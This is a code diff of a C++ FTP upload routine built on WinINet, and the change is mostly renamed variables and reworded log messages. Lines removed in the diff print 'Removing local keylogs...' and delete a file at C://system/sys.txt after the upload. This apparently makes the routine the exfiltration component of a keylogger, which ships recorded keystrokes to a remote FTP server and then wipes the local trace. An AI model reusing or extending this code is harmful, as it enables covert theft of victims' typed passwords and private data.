@@ -12,7 +12,7 @@ bool ftp_comunication::send_file(const std::string & file_path, const std::strin
 {
     HINTERNET hInternet;
     HINTERNET hFtpSession;
-    bool bRet = true;
+    bool state = true;
     hInternet = InternetOpen(nullptr, INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
     if (hInternet == nullptr)
     {
@@ -25,8 +25,8 @@ bool ftp_comunication::send_file(const std::string & file_path, const std::strin
 
         if (hFtpSession == nullptr)
         {
-            std::cerr << "ERROR  During Internet connction. Error number " << GetLastError() << std::endl;
-            bRet = false;
+            std::cerr << "uring Internet connction is failed. error number " << GetLastError() << std::endl;
+            state = false;
         }
         else
         {
@@ -43,7 +43,7 @@ bool ftp_comunication::send_file(const std::string & file_path, const std::strin
                 else
                 {
                     std::cerr << "ERROR  creating folder " + sFolderPath << std::endl;
-                    bRet = false;
+                    state = false;
                 }
             }
             else
@@ -53,35 +53,31 @@ bool ftp_comunication::send_file(const std::string & file_path, const std::strin
             BOOL bSetDir = FtpSetCurrentDirectoryA(hFtpSession, sFolderPath.c_str());
             if (bSetDir)
             {
-                std::cout << "INFO  Set directory to " << sFolderPath << std::endl;
+                std::cout << "set directory to " << sFolderPath << std::endl;
             }
             else
             {
-                std::cerr << "ERROR  Failed to set directory to " << sFolderPath << std::endl;
-                bRet = false;
+                std::cerr << "failed to set directory to " << sFolderPath << std::endl;
+                state = false;
             }
             BOOL bTransfer = FtpPutFileA(hFtpSession, file_path.c_str(), sFileName.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
             if (!bTransfer)
             {
-                std::cerr << "ERROR   Failed to send file." << std::endl;
-                std::cerr << "ERROR   " << GetLastError() << std::endl;
-                bRet = false;
+                std::cerr << "failed to send file. Error code = " << GetLastError() << std::endl;
+                state = false;
             }
             else
             {
-                std::cout << "INFO  Successfully sent file." << std::endl;
+                std::cout << "successfully sent file." << std::endl;
             }
-            std::cout << "INFO  Closing FTP Session" << std::endl;
+            std::cout << "closing FTP Session" << std::endl;
             InternetCloseHandle(hFtpSession); // Close hFtpSession
         }
     }
-    std::cout << "INFO  Closing connection." << std::endl;
+    std::cout << "closing connection." << std::endl;
     InternetCloseHandle(hInternet); // Close hInternet
-    std::cout << "INFO  Removing local keylogs..." << std::endl;
-    remove("C://system/sys.txt");
-    std::cout << "INFO  Done!" << std::endl;
-    return bRet;
-    return true;
+    std::cout << "Done!" << std::endl;
+    return state;
 }
 
 
@@ -96,7 +92,6 @@ bool ftp_comunication::folder_exists(const std::string & folder)
 }
 
 ftp_comunication::ftp_comunication(const std::string& host, const std::string& port, const std::string& user, const std::string& password, const std::string& directory) :
-//ftp_comunication(                const std::string&,      const std::string&,      const std::string&,      const std::string&,          const std::string&);
 	  m_host(host),
       m_port(port),
       m_user(user),
